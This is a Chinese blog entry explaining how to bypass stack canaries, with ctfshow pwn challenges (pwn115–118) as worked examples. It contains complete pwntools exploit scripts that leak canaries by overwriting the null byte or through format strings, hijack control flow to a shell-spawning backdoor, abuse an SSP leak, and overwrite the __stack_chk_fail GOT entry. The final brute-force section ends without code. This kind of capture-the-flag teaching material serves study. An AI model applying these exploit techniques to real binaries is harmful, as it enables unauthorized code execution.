  <entry>
    <title>Canary绕过的姿势</title>
    <link href="/2024/11/20/Canary%E7%BB%95%E8%BF%87%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <url>/2024/11/20/Canary%E7%BB%95%E8%BF%87%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="一、覆盖截断字符获取Canary"><a href="#一、覆盖截断字符获取Canary" class="headerlink" title="一、覆盖截断字符获取Canary"></a>一、覆盖截断字符获取Canary</h2><p>Canary设计其低字节为<code>\x00</code>，本意是阻止被read、write等函数直接将Canary读出来。<strong>通过栈溢出将低位的<code>\x00</code>覆写，就可以读出Canary的值。</strong></p><p>从上面的分析，我们可以梳理出绕过的思路：</p><ul><li>构造第一次溢出，覆写Canary低字节<code>\x00</code>，读取出Canary值</li><li>构造第二次溢出，利用获取的Canary重新构造payload，获取shell。</li></ul><p>例题</p><p>ida查看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ctfshow</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+0h] [ebp-D8h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">200</span>]; <span class="hljs-comment">// [esp+4h] [ebp-D4h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+CCh] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>  &#123;<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>u);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>有后门函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28293</span>)<br><br>elf =ELF(<span class="hljs-string">&#x27;./pwn115&#x27;</span>)<br>backdoor = elf.sym[<span class="hljs-string">&quot;backdoor&quot;</span>]<br>//泄露canary<br>p.recvuntil(<span class="hljs-string">&quot;Try Bypass Me!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">200</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">200</span>)<br>Canary = u32(p.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span> //<span class="hljs-number">0xa</span>是剪掉上面的换行<br>log.info(<span class="hljs-string">&quot;Canary&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">200</span> + p32(Canary)+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">12</span>+p32(backdoor)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="二、利用格式化字符串漏洞获取Canary"><a href="#二、利用格式化字符串漏洞获取Canary" class="headerlink" title="二、利用格式化字符串漏洞获取Canary"></a>二、利用格式化字符串漏洞获取Canary</h2><p>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，从而进行栈溢出。</p><p>例题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned <span class="hljs-built_in">int</span> ctfshow()<br>&#123;<br>  char buf[<span class="hljs-number">32</span>]; // [esp+Ch] [ebp-2Ch] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v2; // [esp+2Ch] [ebp-Ch]<br><br>  v2 = __readgsdword(0x14u);<br>  puts(<span class="hljs-string">&quot;Look me &amp; use me!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, 0x50u);<br>  printf(buf);<br>  read(<span class="hljs-number">0</span>, buf, 0x50u);<br>  <span class="hljs-keyword">return</span> __readgsdword(0x14u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">qwerasd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有后门函数，main函数里两次读入，有格式化字符串漏洞</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-000000000000002C     _BYTE buf;</span><br><span class="hljs-deletion">-000000000000002B     // padding byte</span><br><span class="hljs-deletion">-000000000000002A     // padding byte</span><br><span class="hljs-deletion">-0000000000000029     // padding byte</span><br><span class="hljs-deletion">-0000000000000028     // padding byte</span><br><span class="hljs-deletion">-0000000000000027     // padding byte</span><br><span class="hljs-deletion">-0000000000000026     // padding byte</span><br><span class="hljs-deletion">-0000000000000025     // padding byte</span><br><span class="hljs-deletion">-0000000000000024     // padding byte</span><br><span class="hljs-deletion">-0000000000000023     // padding byte</span><br><span class="hljs-deletion">-0000000000000022     // padding byte</span><br><span class="hljs-deletion">-0000000000000021     // padding byte</span><br><span class="hljs-deletion">-0000000000000020     // padding byte</span><br><span class="hljs-deletion">-000000000000001F     // padding byte</span><br><span class="hljs-deletion">-000000000000001E     // padding byte</span><br><span class="hljs-deletion">-000000000000001D     // padding byte</span><br><span class="hljs-deletion">-000000000000001C     // padding byte</span><br><span class="hljs-deletion">-000000000000001B     // padding byte</span><br><span class="hljs-deletion">-000000000000001A     // padding byte</span><br><span class="hljs-deletion">-0000000000000019     // padding byte</span><br><span class="hljs-deletion">-0000000000000018     // padding byte</span><br><span class="hljs-deletion">-0000000000000017     // padding byte</span><br><span class="hljs-deletion">-0000000000000016     // padding byte</span><br><span class="hljs-deletion">-0000000000000015     // padding byte</span><br><span class="hljs-deletion">-0000000000000014     // padding byte</span><br><span class="hljs-deletion">-0000000000000013     // padding byte</span><br><span class="hljs-deletion">-0000000000000012     // padding byte</span><br><span class="hljs-deletion">-0000000000000011     // padding byte</span><br><span class="hljs-deletion">-0000000000000010     // padding byte</span><br><span class="hljs-deletion">-000000000000000F     // padding byte</span><br><span class="hljs-deletion">-000000000000000E     // padding byte</span><br><span class="hljs-deletion">-000000000000000D     // padding byte</span><br><span class="hljs-deletion">-000000000000000C     _DWORD var_C;</span><br><span class="hljs-deletion">-0000000000000008     // padding byte</span><br><span class="hljs-deletion">-0000000000000007     // padding byte</span><br><span class="hljs-deletion">-0000000000000006     // padding byte</span><br><span class="hljs-deletion">-0000000000000005     // padding byte</span><br></code></pre></td></tr></table></figure><p>canary溢出为32</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>   <br>io = remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28104</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn116&#x27;</span>)<br>backdoor = elf.sym[<span class="hljs-string">&#x27;qwerasd&#x27;</span>]<br><br>io.recv()<br>io.sendline(<span class="hljs-string">&quot;%15$08x&quot;</span>) <span class="hljs-comment">#08表示输出宽度</span><br><span class="hljs-comment">#一个x输出4个字节</span><br><span class="hljs-comment">#格式化字符串we偏移量为7，canary偏移量为32，7+32/4=15</span><br>canary = io.recv()[:<span class="hljs-number">8</span>]<span class="hljs-comment">#只要8位，截断换行                 </span><br>Canary = canary.decode(<span class="hljs-string">&quot;hex&quot;</span>)[::-<span class="hljs-number">1</span>] <span class="hljs-comment">#将Canary转换为小端</span><br> <br>canary_offset = <span class="hljs-number">8</span>*<span class="hljs-number">4</span><br>ret_offset = <span class="hljs-number">3</span>*<span class="hljs-number">4</span><br><br>payload = canary_offset*<span class="hljs-string">&#x27;a&#x27;</span> + Canary + ret_offset*<span class="hljs-string">&#x27;b&#x27;</span> + p32(backdoor) <br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>用第一种做法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28104</span>)<br><br>elf =ELF(<span class="hljs-string">&#x27;./pwn116&#x27;</span>)<br>backdoor = <span class="hljs-number">0x8048586</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Look me &amp; use me!&quot;</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">32</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span>)<br>Canary = u32(p.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span> <br>log.info(<span class="hljs-string">&quot;Canary&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span> + p32(Canary)+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">12</span>+p32(backdoor)<br><br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="3、SSP-Leak利用Canary"><a href="#3、SSP-Leak利用Canary" class="headerlink" title="3、SSP Leak利用Canary"></a>3、SSP Leak利用Canary</h2><p>Canary检测失败时会触发stack_chk_fial函数，输出一段报错，报错会输出文件名，只要覆盖文件名指针，也就是_libc_argv[0]，可以实现任意读，要是flag文件被打开，存储在栈中的话可以利用。</p><p>例题：ctfshow pwn117</p><p>ida查看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+2Ch] [rbp-114h]</span><br>  _BYTE v5[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  logo();<br>  init();<br>  fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( !fd )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such file or directory.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  read(fd, &amp;buf, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Haha,It has reduced you a lot of difficulty!&quot;</span>);<br>  gets(v5);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序逻辑是打开flag文件，并且将其读到bss段处，gets处利用栈溢出，从输入处开始填充字符覆盖_libc_argv<a href="%E6%96%87%E4%BB%B6%E5%90%8D%E6%8C%87%E9%92%88">0</a>，可以实现任意读，读出bss段中的flag</p><p>动态调试处覆盖_libc_argv[0]的偏移量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rbp rsp  <span class="hljs-number">0x7fffffffdd30</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│          <span class="hljs-number">0x7fffffffdd38</span> —▸ <span class="hljs-number">0x7ffff7da8d90</span> ◂— mov    edi, eax<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│          <span class="hljs-number">0x7fffffffdd40</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│          <span class="hljs-number">0x7fffffffdd48</span> —▸ <span class="hljs-number">0x40087b</span> (main) ◂— push   rbp<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│          <span class="hljs-number">0x7fffffffdd50</span> ◂— <span class="hljs-number">0x1ffffde30</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│          <span class="hljs-number">0x7fffffffdd58</span> —▸ <span class="hljs-number">0x7fffffffde48</span> —▸ <span class="hljs-number">0x7fffffffe1e1</span> ◂— <span class="hljs-string">&#x27;/home/ctfshow/Desktop/lianxi4/pwn117&#x27;</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│          <span class="hljs-number">0x7fffffffdd60</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│          <span class="hljs-number">0x7fffffffdd68</span> ◂— <span class="hljs-number">0x3770fc2d9c5950ff</span><br></code></pre></td></tr></table></figure><p>找到存放文件名的地址：0x7fffffffdd58</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdb38</span> —▸ <span class="hljs-number">0x7ffff7e0bcb6</span> (_IO_file_underflow+<span class="hljs-number">390</span>) ◂— test   rax, rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdb40</span> ◂— <span class="hljs-number">0xd68</span> <span class="hljs-comment">/* &#x27;h\\r&#x27; */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdb48</span> —▸ <span class="hljs-number">0x7ffff7e0ba61</span> (_IO_do_write+<span class="hljs-number">177</span>) ◂— mov    r13, rax<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdb50</span> —▸ <span class="hljs-number">0x400f20</span> ◂— <span class="hljs-string">&#x27;Haha,It has reduced you a lot of difficulty!&#x27;</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│      <span class="hljs-number">0x7fffffffdb58</span> —▸ <span class="hljs-number">0x7ffff7f98aa0</span> (_IO_2_1_stdin_) ◂— <span class="hljs-number">0xfbad208b</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdb60</span> —▸ <span class="hljs-number">0x7ffff7f95600</span> (_IO_file_jumps) ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdb68</span> —▸ <span class="hljs-number">0x602070</span> (<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>) —▸ <span class="hljs-number">0x7ffff7f98aa0</span> (_IO_2_1_stdin_) ◂— <span class="hljs-number">0xfbad208b</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdb70</span> —▸ <span class="hljs-number">0x7ffff7d7c740</span> ◂— <span class="hljs-number">0x7ffff7d7c740</span><br></code></pre></td></tr></table></figure><p>调用stdin处：0x7fffffffdb60（_IO_file_jumps处）</p><p>得到偏移量为：504</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="hljs-number">28216</span>)<br>flag = <span class="hljs-number">0x6020A0</span> <span class="hljs-comment">#buf</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Haha,It has reduced you a lot of difficulty!&#x27;</span>)<br>payload = cyclic(<span class="hljs-number">504</span>) + p64(flag)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="4、格式化字符串劫持-stack-chk-fail指针"><a href="#4、格式化字符串劫持-stack-chk-fail指针" class="headerlink" title="4、格式化字符串劫持__stack_chk_fail指针"></a>4、格式化字符串劫持__stack_chk_fail指针</h2><p>同样是检测失败，这次利用格式化字符串，把__stack_chk_fail劫持到后门函数处</p><p>例题：ctfshow pwn118</p><p>ida查看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ctfshow</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+5Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xA0</span>u);<br>  <span class="hljs-built_in">printf</span>(buf);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>有get_flag后门函数，利用格式化字符串将_stack_chk_fail函数got表改写为和后门函数地址处</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io = process(&#x27;./pwn&#x27;)</span><br>p= remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28175</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn118&#x27;</span>)<br><br>stack_chk_fail_got = elf.got[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]<br>getflag = elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>]<br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;stack_chk_fail_got: getflag&#125;)<br>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendline(payload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="5、爆破Canary"><a href="#5、爆破Canary" class="headerlink" title="5、爆破Canary"></a>5、爆破Canary</h2><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><p>fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，根据传入的参数而做相同或不同的事情</p><p>对于Canary，虽然每次进程重启后Canary不同，但是同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。 最低位为0x00，之后逐次爆破，如果canary爆破不成功，则程序崩溃；爆破成功则程序进行下面的逻辑。由此可判断爆破是否成功。 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来</p><p>exp</p>]]></content>
    
    
    
